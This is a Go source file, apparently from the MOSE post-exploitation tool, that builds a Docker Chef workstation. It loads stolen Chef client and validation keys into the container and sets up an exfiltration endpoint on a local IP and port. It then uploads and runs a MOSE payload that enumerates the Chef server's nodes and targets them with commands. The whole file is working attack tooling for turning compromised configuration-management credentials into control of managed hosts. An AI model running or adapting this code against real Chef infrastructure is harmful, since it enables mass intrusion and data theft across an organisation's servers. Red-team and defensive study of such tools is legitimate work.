// Copyright 2019 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package chefutils

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/signal"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"
	"time"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
	"github.com/gobuffalo/packr/v2"
	"github.com/l50/MOSE/pkg/moseutils"
	"github.com/mholt/archiver"
)

var (
	signalChan chan os.Signal
	userInput  moseutils.UserInput
)

type knifeTemplateArgs struct {
	ChefNodeName        string
	ChefClientKey       string
	TargetOrgName       string
	ChefValidationKey   string
	TargetChefServer    string
	TargetValidatorName string
}

func copyFiles(cli *client.Client, id string, files []string, tarLocation string, dockerLocation string) {
	ctx := context.Background()

	tar := archiver.Tar{
		OverwriteExisting: true,
	}

	if err := tar.Archive(files, tarLocation); err != nil {
		log.Fatalln(err)
	}

	reader, err := os.Open(tarLocation)

	if err != nil {
		log.Fatalln(err)
	}

	err = cli.CopyToContainer(ctx, id, dockerLocation, reader, types.CopyToContainerOptions{})

	if err != nil {
		log.Fatalln(err)
	}
}

func simpleRun(cli *client.Client, id string, cmd []string) types.IDResponse {
	ctx := context.Background()

	execID, err := cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			Cmd: cmd,
		},
	)

	if err != nil {
		log.Fatalln(err)
	}

	if err = cli.ContainerExecStart(ctx, execID.ID, types.ExecStartCheck{}); err != nil {
		log.Fatalln(err)
	}

	if userInput.Debug {
		log.Printf("Ran %v in the container.", cmd)
	}

	return execID
}

func build(cli *client.Client) {
	t := archiver.Tar{
		OverwriteExisting: true,
	}

	err := t.Archive([]string{"dockerfiles"}, "tarfiles/dockerfiles.tar")
	if err != nil {
		log.Fatalln(err)
	}

	dockerBuildContext, err := os.Open("tarfiles/dockerfiles.tar")
	if err != nil {
		log.Fatalln(err)
	}
	defer dockerBuildContext.Close()

	opts := types.ImageBuildOptions{
		Tags:       []string{userInput.ImageName},
		Dockerfile: "dockerfiles/Dockerfile",
	}

	ibr, err := cli.ImageBuild(context.Background(), dockerBuildContext, opts)

	if err != nil {
		log.Fatalln("Error building image " + err.Error())
	}
	defer ibr.Body.Close()

	response, err := ioutil.ReadAll(ibr.Body)
	if err != nil {
		log.Fatalln(err.Error())
	}
	if userInput.Debug {
		log.Printf("********* %s **********", ibr.OSType)
		log.Println(string(response))
	}
}

func run(cli *client.Client) string {
	ctx := context.Background()

	hostconfig := &container.HostConfig{}
	if userInput.Rhost != "" {
		hostconfig = &container.HostConfig{
			ExtraHosts: []string{userInput.Rhost},
		}
	}

	resp, err := cli.ContainerCreate(ctx, &container.Config{
		Image:        userInput.ImageName,
		Tty:          true,
		OpenStdin:    true,
		AttachStdin:  true,
		AttachStdout: true,
		AttachStderr: true,
	},
		hostconfig,
		nil,
		userInput.ContainerName,
	)

	if err != nil {
		panic(err)
	}

	if userInput.Debug {
		log.Printf("Running container with id %v", resp.ID)
	}

	if err = cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{}); err != nil {
		log.Fatalln(err)
	}

	return resp.ID
}

func copyToDocker(cli *client.Client, id string) {
	copyFiles(cli, id, []string{userInput.ChefClientKey, userInput.ChefValidationKey, "dockerfiles/knife.rb"}, "tarfiles/keys_knife.tar", "root/.chef/")

	moseutils.Info("Running knife ssl fetch, please wait...")
	_ = simpleRun(cli, id, []string{"knife", "ssl", "fetch"})
}

// runMoseInContainer will upload the MOSE payload for a Chef Workstation
// into a container, so we can run it against a Chef Server
func runMoseInContainer(cli *client.Client, id string, osTarget string) {
	ctx := context.Background()

	payloadPath := "payloads/chef-linux"
	if userInput.FilePath != "" {
		payloadPath = userInput.FilePath
	}

	binPath := path.Join("/", path.Base(payloadPath))

	filesToCopy := []string{payloadPath}

	if userInput.FileUpload != "" {
		filesToCopy = append(filesToCopy, path.Join("payloads", path.Base(userInput.FileUpload)))
	}

	copyFiles(cli, id, filesToCopy, "tarfiles/main.tar", "/")

	_ = simpleRun(cli, id, []string{"chmod", "u+x", binPath})

	execID, err := cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			AttachStderr: true,
			AttachStdin:  true,
			AttachStdout: true,
			Cmd:          []string{binPath, "-i"},
			Tty:          true,
			Detach:       false,
		},
	)

	if err != nil {
		log.Fatalln(err)
	}

	if userInput.Debug {
		log.Printf("Running container exec and attach for container ID %v", execID.ID)
	}
	hj, err := cli.ContainerExecAttach(ctx, execID.ID, types.ExecStartCheck{Detach: false, Tty: true})

	if err != nil {
		log.Fatalln(err)
	}

	// Parse the hijacked reader for the agents
	var agentString = regexp.MustCompile("(?ms)BEGIN NODE LIST \\[(?P<nodes>.*)\\] END NODE LIST")
	names := agentString.SubexpNames()

	buf := new(bytes.Buffer)
	_, err = buf.ReadFrom(hj.Reader)
	if err != nil {
		log.Fatalln(err)
	}
	nodes := make([]string, 0)
	if userInput.Debug {
		// Print output from running mose in the workstation container
		fmt.Println(buf.String())
	}
	for _, match := range agentString.FindAllStringSubmatch(buf.String(), -1) {
		for groupID, group := range match {
			name := names[groupID]
			if name != "" {
				moseutils.Msg("The following nodes were identified: %v", group)
				nodes = append(nodes, strings.Split(group, " ")...)
			}
		}
	}

	hj.Close()

	if len(nodes) < 1 {
		log.Println("No nodes found, exiting...")
		signalChan <- os.Interrupt

		os.Exit(0)
	}
	// Run the MOSE binary on the new workstation that we just created
	agents, err := TargetAgents(nodes, osTarget)
	if err != nil {
		log.Println("Quitting...")
		signalChan <- os.Interrupt
		os.Exit(1)
	}

	if userInput.Debug {
		log.Printf("Command to be run in the container: %v", append([]string{binPath, "-n"}, agents...))
	}

	execID, err = cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			AttachStderr: true,
			AttachStdin:  true,
			AttachStdout: true,
			Cmd:          append([]string{binPath, "-n"}, strings.Join(agents[:], " ")),
			Tty:          true,
			Detach:       false,
		},
	)

	if err != nil {
		log.Fatalln(err)
	}

	if userInput.Debug {
		log.Printf("Running container exec and attach for container ID %v", execID.ID)
	}
	hj, err = cli.ContainerExecAttach(ctx, execID.ID, types.ExecStartCheck{Detach: false, Tty: true})

	if err != nil {
		log.Fatalln(err)
	}

	if _, err = io.Copy(os.Stdout, hj.Reader); err != nil {
		log.Fatalln(err)
	}

	hj.Close()
}

func removeContainer(cli *client.Client, id string) {
	ctx := context.Background()
	timeout, _ := time.ParseDuration("10s")
	err := cli.ContainerStop(ctx, id, &timeout)
	if err != nil {
		log.Fatalln(err)
	}
	err = cli.ContainerRemove(ctx, id, types.ContainerRemoveOptions{Force: true})
	if err != nil {
		log.Fatalln(err)
	}
}

func monitor(cli *client.Client, id string) {
	cleanupDone := make(chan struct{})
	signal.Notify(signalChan, os.Interrupt)
	go func(cli *client.Client, id string) {
		<-signalChan
		log.Println("\nReceived an interrupt, stopping services...")
		removeContainer(cli, id)
		close(cleanupDone)
	}(cli, id)
	<-cleanupDone

	os.Exit(0)
}

func generateKnife() {
	knifeArgs := knifeTemplateArgs{
		ChefNodeName:        userInput.ChefNodeName,
		ChefClientKey:       filepath.Base(userInput.ChefClientKey),
		TargetOrgName:       userInput.TargetOrgName,
		ChefValidationKey:   filepath.Base(userInput.ChefValidationKey),
		TargetChefServer:    userInput.TargetChefServer,
		TargetValidatorName: userInput.TargetValidatorName,
	}

	paramLoc := filepath.Join("templates", userInput.CMTarget)
	box := packr.New("Params", "|")
	box.ResolutionDir = paramLoc
	// Build knife.rb using the knife template
	s, err := box.FindString("knife.tmpl")

	if err != nil {
		log.Fatal(err)
	}

	t, err := template.New("knife").Parse(s)

	if err != nil {
		log.Fatal(err)
	}

	f, err := os.Create("dockerfiles/knife.rb")

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, knifeArgs)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()
}

// SetupChefWorkstationContainer will configure and stand up a chef workstation container that MOSE can use
func SetupChefWorkstationContainer(input moseutils.UserInput) {
	userInput = input
	signalChan = make(chan os.Signal, 1)
	if userInput.Debug {
		log.Printf("Creating exfil endpoint at %v:%v", userInput.LocalIP, userInput.ExfilPort)
		log.Printf("Current orgname: %s", userInput.TargetOrgName)
	}

	CreateUploadRoute(userInput)
	moseutils.Info("Target organization name: %s", userInput.TargetOrgName)
	generateKnife()
	cli, err := client.NewClientWithOpts(client.WithVersion("1.37"))

	if err != nil {
		log.Fatalf("Could not get docker client: %v", err)
	}
	if userInput.Debug {
		log.Println("Building Workstation container, please wait...")
	}

	build(cli)

	if userInput.Debug {
		log.Println("Starting Workstation container, please wait...")
	}
	id := run(cli)

	go monitor(cli, id)

	if userInput.Debug {
		log.Println("Copying keys and relevant resources to workstation container, please wait...")
	}

	copyToDocker(cli, id)
	if userInput.Debug {
		log.Println("Running MOSE in Workstation container, please wait...")
	}

	runMoseInContainer(cli, id, userInput.OSTarget)

	if userInput.Debug {
		log.Println("Running MOSE in Workstation container, please wait...")
	}

	removeContainer(cli, id)
}
